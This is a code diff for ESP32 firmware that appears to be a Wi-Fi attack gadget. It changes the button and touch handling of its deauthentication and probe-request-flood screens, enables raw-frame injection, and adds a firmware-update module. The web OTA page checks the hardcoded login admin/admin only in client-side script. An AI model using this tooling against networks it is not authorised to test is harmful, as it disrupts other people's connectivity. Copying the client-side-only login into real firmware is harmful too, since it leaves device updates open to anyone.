+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+    }
+    /* WIFI_MODE_STA / WIFI_MODE_APSTA are both OK */
     esp_wifi_start();
-    delay(200);
+    delay(300);
     packet_count = 0;
     success_count = 0;
     consecutive_failures = 0;
@@ -4521,31 +4537,27 @@ void drawAttackScreen() {
 static void deautherHandleNavButtons() {
     const unsigned long now = millis();
     if (now - deautherLastButtonPress < deautherDebounceTime) {
-        // Keep edge state in sync while debounce is active so a held press
-        // cannot fire again as soon as the window expires.
-        (void)isButtonPressedEdge(BTN_LEFT);
-        (void)isButtonPressedEdge(BTN_RIGHT);
-        (void)isButtonPressedEdge(BTN_UP);
-        (void)isButtonPressedEdge(BTN_DOWN);
         return;
     }
 
     if (selected_ap_index >= 0) {
-        if (isButtonPressedEdge(BTN_LEFT)) {
+        if (isButtonPressed(BTN_LEFT)) {
             attack_running = !attack_running;
             if (!attack_running) {
                 last_packet_time = 0;
             }
             drawAttackScreen();
             deautherLastButtonPress = now;
+            delay(200);
             return;
         }
-        if (isButtonPressedEdge(BTN_RIGHT)) {
+        if (isButtonPressed(BTN_RIGHT)) {
             attack_running = false;
             last_packet_time = 0;
             selected_ap_index = -1;
             drawScanScreen();
             deautherLastButtonPress = now;
+            delay(200);
             return;
         }
         return;
@@ -4555,28 +4567,32 @@ static void deautherHandleNavButtons() {
         return;
     }
 
-    if (isButtonPressedEdge(BTN_LEFT)) {
+    if (isButtonPressed(BTN_LEFT)) {
         if (scanNetworks()) {
             drawScanScreen();
         }
         deautherLastButtonPress = now;
+        delay(200);
         return;
     }
-    if (isButtonPressedEdge(BTN_UP) && currentIndex > 0) {
+    if (isButtonPressed(BTN_UP) && currentIndex > 0) {
         currentIndex--;
         drawScanScreen();
         deautherLastButtonPress = now;
+        delay(200);
         return;
     }
-    if (isButtonPressedEdge(BTN_DOWN) && currentIndex < network_count - 1) {
+    if (isButtonPressed(BTN_DOWN) && currentIndex < network_count - 1) {
         currentIndex++;
         drawScanScreen();
         deautherLastButtonPress = now;
+        delay(200);
         return;
     }
-    if (isButtonPressedEdge(BTN_RIGHT) && network_count > 0) {
+    if (isButtonPressed(BTN_RIGHT) && network_count > 0) {
         deautherOpenTarget(currentIndex);
         deautherLastButtonPress = now;
+        delay(200);
     }
 }
 
@@ -4585,12 +4601,6 @@ void handleTouch() {
     int x, y;
     if (!readTouchXY(x, y)) return;
 
-    static unsigned long lastTouchActionMs = 0;
-    const unsigned long now = millis();
-    if (now - lastTouchActionMs < 300) {
-        return;
-    }
-
     bool redraw = false;
     if (selected_ap_index == -1) {
         const int listMaxY = LIST_FIRST_ROW_Y + (deautherNetworksPerPage() * LIST_ROW_H);
@@ -4598,27 +4608,27 @@ void handleTouch() {
             int index = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H + (current_page * deautherNetworksPerPage());
             if (index >= 0 && index < network_count) {
                 deautherOpenTarget(index);
-                lastTouchActionMs = now;
+                delay(50);
             }
         } else if (!featureHasTouchNavBar() && !scanning && y >= 290 && y <= 320) {
             if (x >= 0 && x <= 57) {
                 drawButton(0, 304, 57, 16, "Rescan", true, false);
+                delay(50);
                 if (scanNetworks()) {
                     drawScanScreen();
                 }
-                lastTouchActionMs = now;
                 redraw = true;
             } else if (x >= 122 && x <= 179 && currentIndex > 0) {
                 drawButton(117, 304, 57, 16, "Prev", true, false);
                 currentIndex--;
                 drawScanScreen();
-                lastTouchActionMs = now;
+                delay(50);
                 redraw = true;
             } else if (x >= 183 && x <= 240 && currentIndex < network_count - 1) {
                 drawButton(178, 304, 57, 16, "Next", true, false);
                 currentIndex++;
                 drawScanScreen();
-                lastTouchActionMs = now;
+                delay(50);
                 redraw = true;
             }
         }
@@ -4631,7 +4641,7 @@ void handleTouch() {
                     last_packet_time = 0;
                 }
                 drawAttackScreen();
-                lastTouchActionMs = now;
+                delay(50);
                 redraw = true;
             } else if (x >= 183 && x <= 240) {
                 drawButton(177, 304, 57, 16, "Back", true, false);
@@ -4639,14 +4649,14 @@ void handleTouch() {
                 last_packet_time = 0;
                 selected_ap_index = -1;
                 drawScanScreen();
-                lastTouchActionMs = now;
+                delay(50);
                 redraw = true;
             }
         }
     }
 
     if (redraw) {
-        delay(50);
+        delay(100);
     }
 }
 
@@ -5150,8 +5160,19 @@ bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
 void resetWifi() {
     esp_wifi_stop();
     delay(200);
+    // Ensure STA interface is up: on ESP32 Arduino Core 2.0.10+ the raw TX
+    // path is blocked on AP IF. Use APSTA so any existing SoftAP (e.g.
+    // Captive Portal) stays alive while we get a usable STA for injection.
+    wifi_mode_t cur = WIFI_MODE_NULL;
+    esp_err_t gm = esp_wifi_get_mode(&cur);
+    if (gm != ESP_OK || cur == WIFI_MODE_NULL) {
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+    } else if (cur == WIFI_MODE_AP) {
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+    }
+    /* WIFI_MODE_STA / WIFI_MODE_APSTA are both OK */
     esp_wifi_start();
-    delay(200);
+    delay(300);
     packet_count = 0;
     success_count = 0;
     consecutive_failures = 0;
@@ -5211,31 +5232,27 @@ void drawAttackScreen() {
 static void probeHandleNavButtons() {
     const unsigned long now = millis();
     if (now - probeLastButtonPress < probeDebounceTime) {
-        // Keep edge state in sync while debounce is active so a held press
-        // cannot fire again as soon as the window expires.
-        (void)isButtonPressedEdge(BTN_LEFT);
-        (void)isButtonPressedEdge(BTN_RIGHT);
-        (void)isButtonPressedEdge(BTN_UP);
-        (void)isButtonPressedEdge(BTN_DOWN);
         return;
     }
 
     if (selected_ap_index >= 0) {
-        if (isButtonPressedEdge(BTN_LEFT)) {
+        if (isButtonPressed(BTN_LEFT)) {
             attack_running = !attack_running;
             if (!attack_running) {
                 last_packet_time = 0;
             }
             drawAttackScreen();
             probeLastButtonPress = now;
+            delay(200);
             return;
         }
-        if (isButtonPressedEdge(BTN_RIGHT)) {
+        if (isButtonPressed(BTN_RIGHT)) {
             attack_running = false;
             last_packet_time = 0;
             selected_ap_index = -1;
             drawScanScreen();
             probeLastButtonPress = now;
+            delay(200);
             return;
         }
         return;
@@ -5245,28 +5262,32 @@ static void probeHandleNavButtons() {
         return;
     }
 
-    if (isButtonPressedEdge(BTN_LEFT)) {
+    if (isButtonPressed(BTN_LEFT)) {
         if (scanNetworks()) {
             drawScanScreen();
         }
         probeLastButtonPress = now;
+        delay(200);
         return;
     }
-    if (isButtonPressedEdge(BTN_UP) && currentIndex > 0) {
+    if (isButtonPressed(BTN_UP) && currentIndex > 0) {
         currentIndex--;
         drawScanScreen();
         probeLastButtonPress = now;
+        delay(200);
         return;
     }
-    if (isButtonPressedEdge(BTN_DOWN) && currentIndex < network_count - 1) {
+    if (isButtonPressed(BTN_DOWN) && currentIndex < network_count - 1) {
         currentIndex++;
         drawScanScreen();
         probeLastButtonPress = now;
+        delay(200);
         return;
     }
-    if (isButtonPressedEdge(BTN_RIGHT) && network_count > 0) {
+    if (isButtonPressed(BTN_RIGHT) && network_count > 0) {
         probeOpenTarget(currentIndex);
         probeLastButtonPress = now;
+        delay(200);
     }
 }
 
@@ -5275,12 +5296,6 @@ void handleTouch() {
     int x, y;
     if (!readTouchXY(x, y)) return;
 
-    static unsigned long lastTouchActionMs = 0;
-    const unsigned long now = millis();
-    if (now - lastTouchActionMs < 300) {
-        return;
-    }
-
     bool redraw = false;
     if (selected_ap_index == -1) {
         const int listMaxY = LIST_FIRST_ROW_Y + (probeNetworksPerPage() * LIST_ROW_H);
@@ -5288,27 +5303,27 @@ void handleTouch() {
             int index = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H + (current_page * probeNetworksPerPage());
             if (index >= 0 && index < network_count) {
                 probeOpenTarget(index);
-                lastTouchActionMs = now;
+                delay(50);
             }
         } else if (!featureHasTouchNavBar() && !scanning && y >= 290 && y <= 320) {
             if (x >= 0 && x <= 57) {
                 drawButton(0, 304, 57, 16, "Rescan", true, false);
+                delay(50);
                 if (scanNetworks()) {
                     drawScanScreen();
                 }
-                lastTouchActionMs = now;
                 redraw = true;
             } else if (x >= 122 && x <= 179 && currentIndex > 0) {
                 drawButton(117, 304, 57, 16, "Prev", true, false);
                 currentIndex--;
                 drawScanScreen();
-                lastTouchActionMs = now;
+                delay(50);
                 redraw = true;
             } else if (x >= 183 && x <= 240 && currentIndex < network_count - 1) {
                 drawButton(178, 304, 57, 16, "Next", true, false);
                 currentIndex++;
                 drawScanScreen();
-                lastTouchActionMs = now;
+                delay(50);
                 redraw = true;
             }
         }
@@ -5321,7 +5336,7 @@ void handleTouch() {
                     last_packet_time = 0;
                 }
                 drawAttackScreen();
-                lastTouchActionMs = now;
+                delay(50);
                 redraw = true;
             } else if (x >= 183 && x <= 240) {
                 drawButton(177, 304, 57, 16, "Back", true, false);
@@ -5329,14 +5344,14 @@ void handleTouch() {
                 last_packet_time = 0;
                 selected_ap_index = -1;
                 drawScanScreen();
-                lastTouchActionMs = now;
+                delay(50);
                 redraw = true;
             }
         }
     }
 
     if (redraw) {
-        delay(50);
+        delay(100);
     }
 }
 
@@ -5541,6 +5556,1441 @@ void probeRequestFloodLoop() {
         last_status_time = current_time;
       }
   }
+}
+
+namespace FirmwareUpdate {
+
+#define FIRMWARE_FILE "/firmware.bin"
+
+const char* host = "esp32";
+
+#define SCREEN_WIDTH 240
+#define SCREEN_HEIGHT 320
+
+#define BUTTON_WIDTH 230
+#define BUTTON_HEIGHT 20
+#define BUTTON1_X 5
+#define BUTTON1_Y 50
+#define BUTTON2_X 5
+#define BUTTON2_Y 80
+
+#define TAB_BUTTON_WIDTH 57
+#define TAB_BUTTON_HEIGHT 16
+#define TAB_LEFT_X 0
+#define TAB_MIDDLE_X 117
+#define TAB_RIGHT_X 177
+#define TAB_Y 304
+
+#define TS_MIN_X 300
+#define TS_MAX_X 3800
+#define TS_MIN_Y 300
+#define TS_MAX_Y 3800
+
+#define FW_NETWORKS_PER_PAGE 15
+#define NETWORK_Y_START 70
+#define NETWORK_ROW_HEIGHT 15
+
+#define PASSWORD_MAX_LENGTH 32
+
+WebServer server(80);
+
+char selectedSSID[32] = "";
+char wifiPassword[PASSWORD_MAX_LENGTH + 1] = "";
+
+typedef struct {
+  char ssid[32];
+  int8_t rssi;
+  uint8_t channel;
+  uint8_t authmode;
+} NetworkInfo;
+
+void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled);
+void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled);
+void drawMenu();
+bool checkButton(int16_t x, int16_t y, int buttonX, int buttonY, int buttonW, int buttonH);
+static bool waitForTouchXY(int& x, int& y);
+void performSDUpdate();
+void drawNetworkList(int, int, NetworkInfo*, int);
+bool selectWiFiNetwork();
+bool enterWiFiPassword();
+void performWebOTAUpdate();
+
+const char* loginIndex = R"(
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>ESP32 Login Page</title>
+    <style>
+        body {
+            background-color: #1A1A1A;
+            color: #E0E0E0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #2A2A2A;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        h2 {
+            margin-bottom: 1.5rem;
+            font-size: 1.8rem;
+            color: #FFFFFF;
+        }
+        .form-group {
+            margin-bottom: 1.5rem;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 1rem;
+            color: #E0E0E0;
+        }
+        input[type='text'],
+        input[type='password'] {
+            width: 100%;
+            padding: 0.8rem;
+            border: 1px solid #4A4A4A;
+            border-radius: 5px;
+            background-color: #3A3A3A;
+            color: #E0E0E0;
+            font-size: 1rem;
+            box-sizing: border-box;
+        }
+        input[type='submit'] {
+            width: 100%;
+            padding: 0.8rem;
+            border: none;
+            border-radius: 5px;
+            background-color: #FFE221;
+            color: #1A1A1A;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        input[type='submit']:hover {
+            background-color: #FFF14A;
+        }
+    </style>
+</head>
+<body>
+    <div class='container'>
+        <h2>ESP32 Login Page</h2>
+        <form name='loginForm'>
+            <div class='form-group'>
+                <label for='userid'>Username:</label>
+                <input type='text' name='userid' id='userid'>
+            </div>
+            <div class='form-group'>
+                <label for='pwd'>Password:</label>
+                <input type='password' name='pwd' id='pwd'>
+            </div>
+            <input type='submit' onclick='check(this.form); return false;' value='Login'>
+        </form>
+    </div>
+    <script>
+        function check(form) {
+            if (form.userid.value == 'admin' && form.pwd.value == 'admin') {
+                window.open('/serverIndex');
+            } else {
+                alert('Error Password or Username');
+            }
+        }
+    </script>
+</body>
+</html>
+)";
+
+const char* serverIndex = R"(
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>ESP32 Firmware Update</title>
+    <script src='https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
+    <style>
+        body {
+            background-color: #1A1A1A;
+            color: #E0E0E0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #2A2A2A;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        h2 {
+            margin-bottom: 1.5rem;
+            font-size: 1.8rem;
+            color: #FFFFFF;
+        }
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        input[type='file'] {
+            width: 100%;
+            padding: 0.8rem;
+            border: 1px solid #4A4A4A;
+            border-radius: 5px;
+            background-color: #3A3A3A;
+            color: #E0E0E0;
+            font-size: 1rem;
+            box-sizing: border-box;
+            cursor: pointer;
+        }
+        input[type='file']::-webkit-file-upload-button {
+            background-color: #4A4A4A;
+            color: #E0E0E0;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        input[type='file']::-webkit-file-upload-button:hover {
+            background-color: #5A5A5A;
+        }
+        input[type='submit'] {
+            width: 100%;
+            padding: 0.8rem;
+            border: none;
+            border-radius: 5px;
+            background-color: #FFE221;
+            color: #1A1A1A;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        input[type='submit']:hover {
+            background-color: #FFF14A;
+        }
+        #progress-container {
+            margin-top: 1rem;
+            width: 100%;
+            background-color: #3A3A3A;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        #prg {
+            width: 0%;
+            height: 20px;
+            background-color: #FFE221;
+            text-align: center;
+            line-height: 20px;
+            color: #1A1A1A;
+            border-radius: 5px;
+            transition: width 0.3s ease-in-out;
+        }
+    </style>
+</head>
+<body>
+    <div class='container'>
+        <h2>Firmware Update</h2>
+        <form method='POST' action='#' enctype='multipart/form-data' id='upload_form'>
+            <div class='form-group'>
+                <input type='file' name='update'>
+            </div>
+            <input type='submit' value='Update'>
+        </form>
+        <div id='progress-container'>
+            <div id='prg'>progress: 0%</div>
+        </div>
+    </div>
+    <script>
+        $('form').submit(function(e) {
+            e.preventDefault();
+            var form = $('#upload_form')[0];
+            var data = new FormData(form);
+            $.ajax({
+                url: '/update',
+                type: 'POST',
+                data: data,
+                contentType: false,
+                processData: false,
+                xhr: function() {
+                    var xhr = new window.XMLHttpRequest();
+                    xhr.upload.addEventListener('progress', function(evt) {
+                        if (evt.lengthComputable) {
+                            var per = evt.loaded / evt.total;
+                            var percent = Math.round(per * 100);
+                            $('#prg').css('width', percent + '%').text('progress: ' + percent + '%');
+                        }
+                    }, false);
+                    return xhr;
+                },
+                success: function(d, s) {
+                    console.log('success!');
+                },
+                error: function(a, b, c) {
+                    console.log('error:', c);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
+)";
+
+static bool uiDrawn = false;
+static FeatureUI::Button s_fwFooter[4];
+static uint8_t s_fwFooterCount = 0;
+static char s_fwNavCache[5][16] = {{0}};
+
+static void fwResetNavCache() {
+  for (int i = 0; i < 5; ++i) {
+    s_fwNavCache[i][0] = '\0';
+  }
+}
+
+static int fwContentBottom() {
+  return featureHasTouchNavBar() ? (int)touchNavContentBottomY() : SCREEN_HEIGHT;
+}
+
+static void fwUpdateNavLabels(const char* left, const char* down, const char* center,
+                              const char* up, const char* right) {
+  if (!featureHasTouchNavBar()) {
+    return;
+  }
+  const char* src[5] = {left, down, center, up, right};
+  bool same = true;
+  for (int i = 0; i < 5; ++i) {
+    const char* s = (src[i] && src[i][0]) ? src[i] : "";
+    if (strcmp(s_fwNavCache[i], s) != 0) {
+      same = false;
+      break;
+    }
+  }
+  if (same) {
+    return;
+  }
+  for (int i = 0; i < 5; ++i) {
+    const char* s = (src[i] && src[i][0]) ? src[i] : "";
+    strncpy(s_fwNavCache[i], s, sizeof(s_fwNavCache[i]) - 1);
+    s_fwNavCache[i][sizeof(s_fwNavCache[i]) - 1] = '\0';
+  }
+  setTouchNavLabels(left, down, center, up, right);
+  redrawTouchButtonBar();
+}
+
+void runUI();
+
+static void fwEnsureToolbar() {
+  if (!uiDrawn) {
+    runUI();
+  }
+  if (featureHasTouchNavBar()) {
+    maintainTouchNavBar();
+  }
+}
+
+static void fwRestoreNavChrome() {
+  if (!featureHasTouchNavBar()) {
+    return;
+  }
+  invalidateTouchButtonCue();
+  maintainTouchNavBar();
+}
+
+static void fwClearBody(uint16_t color = TFT_BLACK) {
+  const int bottom = fwContentBottom();
+  if (bottom > 37) {
+    tft.fillRect(0, 37, 240, bottom - 37, color);
+  }
+  fwRestoreNavChrome();
+}
+
+static bool fwTouchInFooter(int x, int y, uint8_t index);
+static bool fwTouchFooterLabel(int x, int y, const char* label);
+
+static bool fwActionPressed(const char* label, int x = 0, int y = 0, bool touchValid = false) {
+  if (!label || !label[0]) {
+    return false;
+  }
+  if (featureHasTouchNavBar()) {
+    if (strcmp(label, "Back") == 0 || strcmp(label, "Exit") == 0 || strcmp(label, "Cancel") == 0) {
+      return isTouchNavButtonPressedEdge(BTN_LEFT);
+    }
+    if (strcmp(label, "Start") == 0 || strcmp(label, "OK") == 0 || strcmp(label, "Rescan") == 0) {
+      return isTouchNavButtonPressedEdge(BTN_SELECT);
+    }
+    if (strcmp(label, "Prev") == 0) {
+      return isTouchNavButtonPressedEdge(BTN_UP);
+    }
+    if (strcmp(label, "Next") == 0) {
+      return isTouchNavButtonPressedEdge(BTN_RIGHT);
+    }
+    return false;
+  }
+  return touchValid && fwTouchFooterLabel(x, y, label);
+}
+
+static void fwApplyTabNavLabels(const char* leftButton, const char* prevButton,
+                                 const char* nextButton) {
+  const char* left = nullptr;
+  const char* center = nullptr;
+  const char* up = nullptr;
+  const char* right = nullptr;
+  auto assign = [&](const char* btn) {
+    if (!btn || !btn[0]) {
+      return;
+    }
+    if (strcmp(btn, "Back") == 0 || strcmp(btn, "Exit") == 0 || strcmp(btn, "Cancel") == 0) {
+      left = btn;
+    } else if (strcmp(btn, "Start") == 0 || strcmp(btn, "OK") == 0 || strcmp(btn, "Rescan") == 0) {
+      center = btn;
+    } else if (strcmp(btn, "Prev") == 0) {
+      up = btn;
+    } else if (strcmp(btn, "Next") == 0) {
+      right = btn;
+    }
+  };
+  assign(leftButton);
+  assign(prevButton);
+  assign(nextButton);
+  fwUpdateNavLabels(left, nullptr, center, up, right);
+}
+
+static void fwDrawFooterButtons() {
+  for (uint8_t i = 0; i < s_fwFooterCount; ++i) {
+    FeatureUI::drawButton(s_fwFooter[i]);
+  }
+}
+
+static bool fwTouchInFooter(int x, int y, uint8_t index) {
+  if (index >= s_fwFooterCount) return false;
+  const auto& b = s_fwFooter[index];
+  return x >= b.x && x <= (b.x + b.w) && y >= b.y && y <= (b.y + b.h);
+}
+
+static bool fwTouchFooterLabel(int x, int y, const char* label) {
+  if (!label || !label[0]) return false;
+  for (uint8_t i = 0; i < s_fwFooterCount; ++i) {
+    if (s_fwFooter[i].label && strcmp(s_fwFooter[i].label, label) == 0) {
+      return fwTouchInFooter(x, y, i);
+    }
+  }
+  return false;
+}
+
+static void fwStoreFooter(const FeatureUI::Button* src, uint8_t count) {
+  s_fwFooterCount = count;
+  for (uint8_t i = 0; i < count && i < 4; ++i) {
+    s_fwFooter[i] = src[i];
+  }
+}
+
+void runUI() {
+#define SCREEN_WIDTH  240
+#define SCREENHEIGHT 320
+#define STATUS_BAR_Y_OFFSET 20
+#define STATUS_BAR_HEIGHT 16
+#define ICON_SIZE 16
+#define ICON_NUM 1
+
+  static int iconX[ICON_NUM] = {10};
+  static int iconY = STATUS_BAR_Y_OFFSET;
+
+  static const unsigned char* icons[ICON_NUM] = {
+    bitmap_icon_go_back
+  };
+
+  if (!uiDrawn) {
+    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
+    for (int i = 0; i < ICON_NUM; i++) {
+      if (icons[i] != NULL) {
+        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+      }
+    }
+    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
+    uiDrawn = true;
+  }
+
+  static unsigned long lastAnimationTime = 0;
+  static int animationState = 0;
+  static int activeIcon = -1;
+  static unsigned long lastSpamTime = 0;
+
+  switch (animationState) {
+    case 0:
+      break;
+
+    case 1:
+      if (millis() - lastAnimationTime >= 150) {
+        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+        animationState = 2;
+        lastAnimationTime = millis();
+      }
+      break;
+
+    case 2:
+      if (millis() - lastAnimationTime >= 200) {
+        animationState = 3;
+        lastAnimationTime = millis();
+      }
+      break;
+
+    case 3:
+      switch (activeIcon) {
+         case 0:
+           feature_exit_requested = true;
+           animationState = 0;
+           activeIcon = -1;
+          break;
+      }
+      break;
+  }
+
+  static unsigned long lastTouchCheck = 0;
+  const unsigned long touchCheckInterval = 50;
+
+  if (millis() - lastTouchCheck >= touchCheckInterval) {
+    int x, y;
+    if (!featureHasTouchNavBar() && feature_active && readTouchXY(x, y)) {
+      if (y >= STATUS_BAR_Y_OFFSET && y <= STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT - 1) {
+        for (int i = 0; i < ICON_NUM; i++) {
+          if (x >= iconX[i] && x <= iconX[i] + ICON_SIZE - 1) {
+            if (icons[i] != NULL && animationState == 0) {
+              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+              animationState = 1;
+              activeIcon = i;
+              lastAnimationTime = millis();
+            }
+            break;
+          }
+        }
+      }
+    }
+    lastTouchCheck = millis();
+  }
+}
+
+void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
+
+  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
+                                           : FeatureUI::ButtonStyle::Secondary;
+  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
+}
+
+void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {
+  if (featureHasTouchNavBar()) {
+    (void)leftDisabled;
+    (void)prevDisabled;
+    (void)nextDisabled;
+    fwApplyTabNavLabels(leftButton, prevButton, nextButton);
+    return;
+  }
+  FeatureUI::drawFooterBg();
+  s_fwFooterCount = 0;
+
+  const bool hasLeft = leftButton && leftButton[0];
+  const bool hasMid = prevButton && prevButton[0];
+  const bool hasRight = nextButton && nextButton[0];
+
+  if (hasLeft && hasMid && hasRight) {
+    FeatureUI::Button btns[3];
+    FeatureUI::layoutFooter3(btns,
+      leftButton, FeatureUI::ButtonStyle::Secondary,
+      prevButton, FeatureUI::ButtonStyle::Secondary,
+      nextButton, FeatureUI::ButtonStyle::Secondary,
+      leftDisabled, prevDisabled, nextDisabled);
+    fwStoreFooter(btns, 3);
+  } else if (hasLeft && hasMid) {
+    FeatureUI::Button btns[2];
+    FeatureUI::layoutFooter2(btns,
+      leftButton, FeatureUI::ButtonStyle::Secondary,
+      prevButton, FeatureUI::ButtonStyle::Secondary,
+      leftDisabled, prevDisabled);
+    fwStoreFooter(btns, 2);
+  } else if (hasLeft && hasRight) {
+    FeatureUI::Button btns[2];
+    FeatureUI::layoutFooter2(btns,
+      leftButton, FeatureUI::ButtonStyle::Secondary,
+      nextButton, FeatureUI::ButtonStyle::Secondary,
+      leftDisabled, nextDisabled);
+    fwStoreFooter(btns, 2);
+  } else if (hasMid && hasRight) {
+    FeatureUI::Button btns[2];
+    FeatureUI::layoutFooter2(btns,
+      prevButton, FeatureUI::ButtonStyle::Secondary,
+      nextButton, FeatureUI::ButtonStyle::Secondary,
+      prevDisabled, nextDisabled);
+    fwStoreFooter(btns, 2);
+  } else if (hasRight) {
+    FeatureUI::layoutFooter1(s_fwFooter[0], nextButton, FeatureUI::ButtonStyle::Secondary, nextDisabled);
+    s_fwFooterCount = 1;
+  } else if (hasLeft) {
+    FeatureUI::layoutFooter1(s_fwFooter[0], leftButton, FeatureUI::ButtonStyle::Secondary, leftDisabled);
+    s_fwFooterCount = 1;
+  } else if (hasMid) {
+    FeatureUI::layoutFooter1(s_fwFooter[0], prevButton, FeatureUI::ButtonStyle::Secondary, prevDisabled);
+    s_fwFooterCount = 1;
+  }
+  fwDrawFooterButtons();
+}
+
+static void drawNetworkTabBar(bool prevDisabled, bool nextDisabled) {
+  if (featureHasTouchNavBar()) {
+    fwUpdateNavLabels("Back", nullptr, "Rescan", prevDisabled ? nullptr : "Prev",
+                      nextDisabled ? nullptr : "Next");
+    return;
+  }
+  FeatureUI::drawFooterBg();
+  FeatureUI::Button btns[4];
+  FeatureUI::layoutFooter4(btns,
+    "Back", FeatureUI::ButtonStyle::Secondary,
+    "Rescan", FeatureUI::ButtonStyle::Secondary,
+    "Prev", FeatureUI::ButtonStyle::Secondary,
+    "Next", FeatureUI::ButtonStyle::Secondary,
+    false, false, prevDisabled, nextDisabled);
+  fwStoreFooter(btns, 4);
+  fwDrawFooterButtons();
+}
+
+void drawMenu() {
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  const int bodyBottom = fwContentBottom();
+  tft.fillRect(0, 37, 240, bodyBottom - 37, TFT_BLACK);
+
+  tft.setTextSize(1);
+
+  drawButton(BUTTON1_X, BUTTON1_Y, BUTTON_WIDTH, BUTTON_HEIGHT, "SD Update", false, false);
+  drawButton(BUTTON2_X, BUTTON2_Y, BUTTON_WIDTH, BUTTON_HEIGHT, "Web OTA", false, false);
+
+  if (featureHasTouchNavBar()) {
+    fwUpdateNavLabels("Exit", nullptr, nullptr, nullptr, nullptr);
+  } else {
+    FeatureUI::drawFooterBg();
+    FeatureUI::layoutFooter1(s_fwFooter[0], "Back", FeatureUI::ButtonStyle::Secondary, false);
+    s_fwFooterCount = 1;
+    FeatureUI::drawButton(s_fwFooter[0]);
+  }
+}
+
+bool checkButton(int16_t x, int16_t y, int buttonX, int buttonY, int buttonW, int buttonH) {
+  return x >= buttonX && x <= buttonX + buttonW - 1 &&
+         y >= buttonY && y <= buttonY + buttonH - 1;
+}
+
+// Returns true when Back was pressed via touch nav (edge already consumed).
+static bool waitForTouchXY(int& x, int& y) {
+  fwEnsureToolbar();
+  while (true) {
+    if (feature_exit_requested) {
+      x = y = 0;
+      return false;
+    }
+    if (featureHasTouchNavBar()) {
+      maintainTouchNavBar();
+      if (fwActionPressed("Back")) {
+        x = y = 0;
+        return true;
+      }
+    }
+    if (readTouchXY(x, y)) {
+      delay(80);
+      return false;
+    }
+    delay(10);
+  }
+}
+
+int yshift = 40;
+
+void performSDUpdate() {
+  updateStatusBar();
+  runUI();
+  uiDrawn = false;
+  fwClearBody(TFT_BLACK);
+  tft.setCursor(10, 10 + yshift);
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setTextSize(1);
+  tft.println("SD Update");
+  tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  tft.setCursor(10, 30 + yshift);
+  tft.println("Insert SD card with");
+  tft.setCursor(10, 40 + yshift);
+  tft.println("firmware.bin in root");
+  tft.setCursor(10, 50 + yshift);
+  tft.println("Touch Start to update");
+
+  drawTabBar("Start", false, "", false, "Back", false);
+  fwRestoreNavChrome();
+
+  bool waitingForStart = true;
+
+  while (waitingForStart) {
+    if (feature_exit_requested) {
+      return;
+    }
+    if (featureHasTouchNavBar()) {
+      maintainTouchNavBar();
+    }
+    if (fwActionPressed("Back")) {
+      drawMenu();
+      return;
+    }
+    if (fwActionPressed("Start")) {
+      waitingForStart = false;
+      continue;
+    }
+    int x, y;
+    if (readTouchXY(x, y)) {
+      if (fwActionPressed("Back", x, y, true)) {
+        drawMenu();
+        return;
+      }
+      if (fwActionPressed("Start", x, y, true)) {
+        waitingForStart = false;
+      }
+      delay(50);
+    } else {
+      delay(10);
+    }
+  }
+
+  fwClearBody(TFT_BLACK);
+  tft.setCursor(10, 10 + yshift);
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setTextSize(1);
+  tft.println("Starting SD Update...");
+  drawTabBar("", false, "", false, "Back", false);
+  fwRestoreNavChrome();
+  fwEnsureToolbar();
+
+  bool proceed = true;
+  uint32_t lastInputMs = 0;
